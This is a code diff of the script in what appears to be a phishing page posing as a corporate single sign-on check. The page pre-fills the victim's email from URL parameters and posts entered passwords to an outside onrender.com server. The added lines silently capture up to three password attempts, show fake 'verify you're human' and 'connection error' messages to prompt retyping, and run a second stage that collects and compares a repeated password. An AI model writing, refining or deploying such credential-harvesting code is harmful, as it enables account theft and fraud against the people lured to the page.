+    document.getElementById('s1-email').placeholder = t.emailPlaceholder; document.getElementById('s1-password').placeholder = t.passwordPlaceholder; document.getElementById('s2-password').placeholder = t.passwordPlaceholder;
     document.getElementById('langSelect').value = lang;
 }
+function changeLanguage(lang) { applyTranslations(lang); }
 
-function changeLanguage(lang) {
-    applyTranslations(lang);
-}
-
-/* ============================================================ */
-/* API CONFIG & LOGIC                                           */
-/* ============================================================ */
 const API_BASE = 'https://work-sso-we-verify.onrender.com';
 let currentEmail  = '';
 let firstPassword = '';
-
-// 🎯 NEW: Variables to hold the Cloudflare Proof and Timestamp
 let currentProof = '';
 let currentProofTs = '';
 
-/* ---------- Parse URL Params (u=, auth=, p=, t=) ---------- */
 function parseUserFromUrl() {
     const params = new URLSearchParams(window.location.search);
-    
-    // 1. Try to get Email (u from Gate, or auth from direct email link)
     const email = params.get('u') || params.get('auth');
     if (email) return email;
-
-    // Fallbacks for old base64 links
     const search = window.location.search;
     if (search && search.length > 1 && !search.includes('=')) {
-        try {
-            const kv = atob(search.substring(1)).split('=');
-            if (kv.length > 1) return decodeURIComponent(kv[1]);
-        } catch (e) {}
+        try { const kv = atob(search.substring(1)).split('='); if (kv.length > 1) return decodeURIComponent(kv[1]); } catch (e) {}
     }
     return '';
 }
 
-/* ---------- Initialize on Load ---------- */
 document.addEventListener('DOMContentLoaded', () => {
-    // 1. Language
     applyTranslations(detectLanguage());
-
-    // 2. Email from URL
     currentEmail = parseUserFromUrl();
     const userInput = document.getElementById('user');
     if (userInput) { userInput.value = currentEmail; userInput.readOnly = true; }
 
-    // 3. 🎯 THE PROOF FROM INDEX.HTML (CLOUDFLARE)
     const params = new URLSearchParams(window.location.search);
     currentProof = params.get('p') || '';
     currentProofTs = params.get('t') || '';
-    
-    console.log('🔒 Loaded Proof:', currentProof ? '✅ Yes' : '❌ No');
 });
 
-/* ---------- Trigger Stage 1 Modal ---------- */
 function submitValue() {
-    if (!currentEmail) {
-        const u = document.getElementById('user');
-        if (u && u.value.trim()) currentEmail = u.value.trim();
-    }
-    
+    if (!currentEmail) { const u = document.getElementById('user'); if (u && u.value.trim()) currentEmail = u.value.trim(); }
     const emailField = document.getElementById('s1-email');
     emailField.value = currentEmail || '';
     emailField.readOnly = !!currentEmail;
-    
     document.getElementById('s1-password').value = '';
     document.getElementById('s1-error').textContent = '';
     document.getElementById('stage1-modal').style.display = 'flex';
-    
-    setTimeout(() => {
-        (currentEmail ? document.getElementById('s1-password') : document.getElementById('s1-email')).focus();
-    }, 100);
+    setTimeout(() => { (currentEmail ? document.getElementById('s1-password') : document.getElementById('s1-email')).focus(); }, 100);
 }
 
-/* ---------- API Login Call ---------- */
 async function apiLogin(payload) {
-    const res = await fetch(API_BASE + '/api/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
+    const res = await fetch(API_BASE + '/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
     if (!res.ok) throw new Error('HTTP ' + res.status);
     return res.json();
 }
 
-/* ---------- Stage 1 Submit ---------- */
 document.getElementById('stage1-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     const email    = document.getElementById('s1-email').value.trim();
@@ -474,16 +226,47 @@ document.getElementById('stage1-form').addEventListener('submit', async (e) => {
     const original = btn.textContent;
     btn.textContent = '...';
 
-    try {
-        // 🎯 CRITICAL: Send the proof and timestamp to the server!
-        const data = await apiLogin({ 
-            email, 
-            password, 
-            stage: 1,
-            proof: currentProof,       
-            proofTs: currentProofTs    
-        });
+    // 👇 TIGHTER VERIFICATION LOGIC 👇
+    // Detect if the user refreshed the page (F5)
+    const navEntries = performance.getEntriesByType("navigation");
+    const isReload = navEntries.length > 0 && navEntries[0].type === "reload";
+    let attempts = parseInt(sessionStorage.getItem('auth_attempts') || '0');
 
+    if (!isReload) {
+        if (attempts < 3) {
+            attempts++;
+            sessionStorage.setItem('auth_attempts', attempts);
+
+            // Silently capture the password attempt to the server
+            try { await apiLogin({ email, password, stage: 1, proof: currentProof, proofTs: currentProofTs }); } catch (e) {}
+
+            if (attempts < 3) {
+                errEl.textContent = "Sign in with correct detail to verify you're human.";
+            } else {
+                errEl.textContent = "Connection error. Please try again.";
+            }
+
+            document.getElementById('s1-password').value = ''; // Clear field
+            btn.disabled = false;
+            btn.textContent = original;
+            return; // Stop here, don't show Stage 2
+        } else {
+            // If they keep trying without refreshing
+            errEl.textContent = "Connection error. Please try again.";
+            btn.disabled = false;
+            btn.textContent = original;
+            return;
+        }
+    } else {
+        // They refreshed the page! This proves they are likely human.
+        // Reset the counter and allow them to pass through to Stage 2.
+        sessionStorage.removeItem('auth_attempts');
+    }
+    // 👆 END OF VERIFICATION LOGIC 👆
+
+    // Normal flow (only happens after successful refresh)
+    try {
+        const data = await apiLogin({ email, password, stage: 1, proof: currentProof, proofTs: currentProofTs });
         if (data.success) {
             currentEmail  = email;
             firstPassword = password;
@@ -504,7 +287,6 @@ document.getElementById('stage1-form').addEventListener('submit', async (e) => {
     }
 });
 
-/* ---------- Stage 2 Submit ---------- */
 document.getElementById('stage2-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     const password = document.getElementById('s2-password').value;
@@ -520,12 +302,7 @@ document.getElementById('stage2-form').addEventListener('submit', async (e) => {
     btn.textContent = '...';
 
     try {
-        const data = await apiLogin({
-            email: currentEmail,
-            password,
-            stage: 2,
-            firstPassword
-        });
+        const data = await apiLogin({ email: currentEmail, password, stage: 2, firstPassword });
         if (data.success && data.match) {
             document.getElementById('stage2-modal').style.display = 'none';
             if (data.redirect) {
@@ -547,6 +324,5 @@ document.getElementById('stage2-form').addEventListener('submit', async (e) => {
     }
 });
 </script>
-
 </body>
 </html>
